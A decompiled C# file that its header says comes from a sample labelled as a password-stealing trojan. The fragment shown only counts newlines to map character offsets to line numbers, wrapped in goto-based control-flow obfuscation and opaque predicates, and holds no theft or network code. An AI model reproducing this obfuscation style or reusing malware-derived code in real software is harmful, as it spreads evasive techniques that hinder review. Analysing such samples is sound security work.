// Decompiled with JetBrains decompiler
// Type: wG.uF
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System.Collections.Generic;
using System.Linq;

namespace wG
{
  public struct uF
  {
    internal SortedList<int, int> bGB;
    internal static object gf;

    private void B8(string _param1, int _param2, int _param3, ref int _param4, out int _param5)
    {
      _param5 = 2;
      int key = _param2 + 1;
label_2:
      if (key <= _param3)
        goto label_7;
      else
        goto label_9;
label_1:
      int num;
      switch (num)
      {
        case 0:
          return;
        case 1:
          goto label_2;
        default:
          return;
      }
label_7:
      if (_param1[key - 1] == '\n')
        goto label_5;
label_3:
      ++key;
      ++_param5;
      num = 1;
      if (uF.WS() != null)
      {
        num = 0;
        goto label_1;
      }
      else
        goto label_1;
label_5:
      this.bGB[key] = ++_param4;
      _param5 = 1;
      goto label_3;
label_9:
      --_param5;
      num = uF.Oj() ? 0 : 0;
      goto label_1;
    }

    public void gz(string _param1, int _param2, out int _param3, out int _param4)
    {
      int num1 = this.bGB.Count<KeyValuePair<int, int>>();
      KeyValuePair<int, int> keyValuePair;
      while (true)
      {
        bool flag1 = num1 > 0;
        int num2 = 3;
label_1:
        int num3 = num2;
        while (true)
        {
          bool flag2;
          switch (num3)
          {
            case 1:
              if (flag2)
                break;
              goto label_3;
            case 2:
              goto label_14;
            case 3:
              if (flag1)
              {
                keyValuePair = this.bGB.ElementAt<KeyValuePair<int, int>>(num1 - 1);
                if (keyValuePair.Key != _param2)
                {
                  flag2 = keyValuePair.Key < _param2;
                  if (uF.Oj())
                  {
                    num3 = 1;
                    continue;
                  }
                  goto label_1;
                }
                else
                  goto label_9;
              }
              else
                goto label_8;
          }
          _param3 = keyValuePair.Value;
          this.B8(_param1, keyValuePair.Key, _param2, ref _param3, out _param4);
          if (uF.WS() == null)
            num3 = 2;
          else
            goto label_1;
        }
label_3:
        --num1;
      }
label_14:
      return;
label_8:
      _param3 = 1;
      this.B8(_param1, 0, _param2, ref _param3, out _param4);
      return;
label_9:
      _param3 = keyValuePair.Value;
      _param4 = 1;
    }

    internal static bool Oj() => uF.gf == null;

    internal static object WS() => uF.gf;
  }
}
